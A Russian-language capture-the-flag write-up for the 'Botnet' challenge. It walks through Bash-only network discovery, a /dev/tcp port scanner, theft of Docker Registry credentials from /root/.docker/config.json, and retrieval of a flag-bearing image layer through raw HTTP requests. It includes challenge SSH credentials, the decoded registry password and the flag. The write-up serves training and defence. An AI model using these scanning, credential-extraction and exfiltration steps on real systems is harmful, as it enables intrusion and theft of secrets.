# Botnet — технический разбор

**Флаг:** `avito{the_bo7ne7_15_CompL3tely_ComPRomISed}`
**Класс:** Infrastructure / Linux / Docker Registry

## Краткое техническое резюме

Начальная точка — интерактивная SSH-сессия в минимальном контейнере, содержащем только `bash` и
`base64`. Сетевая топология восстанавливается по `/proc/net/*`, а TCP-запросы выполняются через
встроенный в Bash псевдопуть `/dev/tcp/HOST/PORT`. В соседней Docker-сети обнаруживается приватный
Docker Registry. Basic Auth credentials извлекаются из `/root/.docker/config.json`; затем через
Registry HTTP API загружается слой образа `fastapi`, содержащий `/app/flag.txt`.

---

**Для воспроизведения:** Нужны действующий SSH-доступ и пароль через `--password` или `BOTNET_PASS`. Solver удерживает один интерактивный сеанс, поскольку адреса и Registry меняются при переподключении.

## 1. Контекст и цель

Задача предоставляет shell-доступ к узлу в контейнерной сети. Образ не содержит стандартных
userspace-утилит, поэтому reconnaissance и exfiltration должны выполняться средствами Bash.

Доступ: `ssh bot@botnet-r7hjkp1j.avitoctf.ru`, пароль
`K8jjxsRJilXcCWfMyFvxGQ`. Исходный код отсутствует; исследование выполняется в
режиме black-box.

## 2. Разведка и поверхность атаки

- SSH предоставляет interactive Bash session внутри контейнера.
- Сообщение `Booting up the challenge...` при установлении session указывает, что для каждого
  подключения создаётся новый контейнер.
- `compgen -c` перечисляет только три external executables: `docker-init`, `bash`, `base64`.
  Утилиты `cat`, `ls`, `ip`, `curl`, `python`, `tar` и `gzip` отсутствуют.
- Корень файловой системы: `/bin /dev /etc /proc /root /sbin /sys`; `/tmp`, `/usr`, `/var` и
  `/home` отсутствуют. Процесс работает с `uid=0` внутри непривилегированного scratch-контейнера.
- Псевдофайлы `/proc/net/*` (`route`, `fib_trie`, `tcp`, `arp`) раскрывают routes, local addresses и
  sockets без дополнительных network utilities.
- Bash redirection через `/dev/tcp/HOST/PORT` предоставляет TCP client primitive без `nc` или `curl`.

## 3. Анализ и проверка гипотез

**PTY requirement.** `ssh host 'id'` возвращает `Sorry, no commands allowed. Just 'ssh user@host'
please.`, а command injection через stdin non-interactive session — `Only interactive TTY sessions
are allowed.` Использование `ssh -tt` с `expect`/`sshpass` и sentinel markers
(`echo __START__` / `echo __END__$?`) подтверждает обязательность PTY. Все этапы выполняются одним
stateful Bash script в пределах одной session.

**Bash-only environment.** Необходимые операции реализуются shell builtins:
- file read: `printf '%s\n' "$(< /path)"`;
- directory enumeration: pathname expansion, например `echo /bin/*`;
- decoding little-endian hex addresses из `/proc/net/route`: `0B00007F` → `7F.00.00.0B` →
  `127.0.0.11`; результат совпадает с адресом embedded Docker DNS из
  `/etc/resolv.conf`.

**Эфемерная адресация.** При каждом подключении контейнер получает новый адрес (10.0.4.x,
10.0.5.x, …, 10.0.13.x). Reconnaissance и exploitation должны завершаться в одной SSH-сессии,
поскольку вместе с контейнером пересоздаются топология и Registry tags.

**CPU-safe connection timeout.** Initial port scanner использовал active polling
`while kill -0 $pid; do :; done` вокруг background `/dev/tcp` connection. Session завершалась после
примерно 20 hosts. `ulimit -a` показывает `cpu time (seconds) 10`; active polling исчерпывает этот
лимит и приводит к `SIGXCPU`. Blocking `read -t 30` использует `0m0.000s 0m0.002s` CPU time по
результату `times`, поэтому применяется как low-CPU timer.

В background subshell (`( read -t N; … ) &`) stdin перенаправляется на `/dev/null`, поэтому `read`
немедленно получает EOF. Таймер должен выполняться в foreground, после чего состояние background
connection проверяется через `kill -0 $cpid`.

**Adjacent service discovery.** TCP scan подсети `/26` показывает стабильную address allocation:
`network+1` — Docker bridge gateway, `network+2` — adjacent container, `network+3` — текущий
container. На `network+2` открыт `5000/tcp`.

**Идентификация сервиса.** `GET / HTTP/1.0` на `sib:5000` → `200 OK` с пустым телом.
`GET /v2/` возвращает `401` с заголовком `Docker-Distribution-Api-Version: registry/2.0` и Basic Auth
challenge. Paths `/bot`, `/gate.php`, `/heartbeat` и `/panel` возвращают стандартный Go `404`, а
protocol header идентифицирует Docker Registry v2.

**Извлечение credentials.** Default/common pairs (`admin:admin`, SSH credentials) возвращают `401`.
`/root/.docker/config.json` содержит поле `auth` (Base64 от `username:password`) —
`base64 -d` возвращает `admin:strongpass`.

## 4. Корневая причина

Exploit chain использует композицию ошибок управления secrets и сетевой сегментации:

1. **Missing network segmentation.** Приватный Docker Registry (`sib:5000`) доступен с adjacent
   workload без network policy или host firewall restrictions.
2. **Credentials хранятся в plaintext-equivalent form.** Registry защищён Basic Auth, но authentication data
   сохраняются в `/root/.docker/config.json` после `docker login`.
3. **Secret включён в image layer.** `COPY flag.txt /app/flag.txt` создаёт отдельный layer;
   Registry Blob API предоставляет его любому principal с read access к repository.

## 5. Эксплуатация

```bash
# 0. Подключение с PTY
sshpass -p 'K8jjxsRJilXcCWfMyFvxGQ' ssh -tt -o StrictHostKeyChecking=no \
  -o UserKnownHostsFile=/dev/null bot@botnet-r7hjkp1j.avitoctf.ru
```

Дальнейшие операции выполняются внутри одной session, поскольку container state изменяется при
повторном подключении. Функции `find_myip`, `find_net`, `alive`, `find_sibling` и `http_get_b64`
определены в Bash toolkit основного solver:

```bash
# 1. Network discovery через /proc/net/*
find_myip
find_net
printf 'myip=%s network=%s mask=%s\n' "$myip" "$netbase" "$netmask"

# 2. TCP connect timeout без active polling
alive(){ host=$1;port=$2;to=$3
  (exec 3<>/dev/tcp/$host/$port) 2>/dev/null & cpid=$!
  read -t $to                                  # blocking wait, ~0 CPU
  if kill -0 $cpid 2>/dev/null; then
    kill -9 $cpid 2>/dev/null; wait $cpid 2>/dev/null; return 2   # connect timeout
  else
    wait $cpid 2>/dev/null; return $?                              # 0=open, 1=closed
  fi
}

# 3. TCP scan /26 -> service на network+2:5000
find_sibling

# 4. Извлечение Registry Basic Auth из Docker client configuration
printf '%s\n' "$(< /root/.docker/config.json)"
# {"auths":{"registry:5000":{"auth":"YWRtaW46c3Ryb25ncGFzcw=="}}}
# base64-decode -> admin:strongpass

# 5. Registry catalog
exec 3<>"/dev/tcp/$sib/5000"
printf 'GET /v2/_catalog HTTP/1.1\r\nHost: registry:5000\r\n
Authorization: Basic YWRtaW46c3Ryb25ncGFzcw==\r\nConnection: close\r\n\r\n' >&3
# {"repositories":["express","fastapi","flask"]}

# 6. Tag -> manifest -> config history образа fastapi:
#    final history[] entry: "COPY ... in /app/flag.txt" -> target is the final layer

# 7. Download target layer (~185 bytes) and encode binary response with base64.
#    Binary data is not stored in Bash variables because they cannot preserve NUL bytes.
exec 3<>"/dev/tcp/$sib/5000"
printf 'GET /v2/fastapi/blobs/%s HTTP/1.1\r\n...\r\n\r\n' "$digest" >&3
base64 <&3
```

Локальная обработка при наличии `tar`, `gzip` и `python3`:

```bash
base64 -D -i blob_b64.txt -o raw_response.bin
python3 -c "d=open('raw_response.bin','rb').read(); \
    open('layer.tar.gz','wb').write(d[d.find(b'\r\n\r\n')+4:])"
tar -xzf layer.tar.gz -C extracted
cat extracted/app/flag.txt
```

Скрипт `solve_botnet.py` (см. §8) автоматизирует шаги 0–7 end-to-end через одну `ssh`-сессию.

## 6. Флаг

```
avito{the_bo7ne7_15_CompL3tely_ComPRomISed}
```

## 7. Выводы и рекомендации

Компрометация узла в плоской сети предоставляет доступ к сервисам и credentials всей инфраструктуры.

- **Credential exposure.** Reusable Registry credentials в `~/.docker/config.json` становятся
  доступны при компрометации workload.
- **Network policy.** Workload nodes не должны иметь direct access к management services и соседним
  workloads. Требуются ingress/egress allowlists и отдельный service network.
- **Credential lifecycle.** Вместо long-lived `docker login` credentials следует использовать
  short-lived scoped tokens или credential helper и удалять `config.json` после build/pull operation.
- **Secret provisioning.** Secrets не должны попадать в image layers; их следует передавать в runtime
  через secret store или read-only mount с минимальными permissions.
- **Проверка минимальных контейнеров.** Отсутствие userspace-утилит не устраняет сетевые примитивы:
  `/dev/tcp` и `base64` обеспечивают HTTP transport и exfiltration. При `ulimit -t` следует применять
  блокирующие операции (`read -t`), исключая active polling.

## 8. Файлы для воспроизведения

В репозитории:

- [`solve_botnet.py`](solve_botnet.py) — self-contained Python solver (stdlib, `subprocess` и `ssh`),
  воспроизводящий всю цепочку §5 за одну SSH-сессию: network discovery → Registry identification →
  credentials → catalog → manifest → target layer extraction.
- [`FLAG.txt`](FLAG.txt) — сохранённый флаг.

SSH password передаётся solver через `--password` или environment variable `BOTNET_PASS`; default
credential в коде отсутствует. Session-local `ACCESS.txt` не входит в набор файлов в Git.
